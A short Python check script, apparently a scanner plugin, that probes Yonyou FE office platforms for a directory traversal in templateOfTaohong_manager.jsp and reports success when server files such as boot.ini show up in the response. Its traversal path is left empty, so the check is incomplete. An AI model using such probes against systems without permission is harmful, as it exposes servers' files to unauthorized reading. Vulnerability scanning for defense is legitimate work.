#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/oa/用友OA/用友 FE协作办公平台 templateOfTaohong_manager.jsp 目录遍历漏洞.html',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '用友 FE协作办公平台 templateOfTaohong_manager.jsp 目录遍历',

      'level'     :   'low',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = ''
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "boot.ini" in res.text and '[FE_MESSAGE_PUSH]' in res.text and '[OA]' in res.text:
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret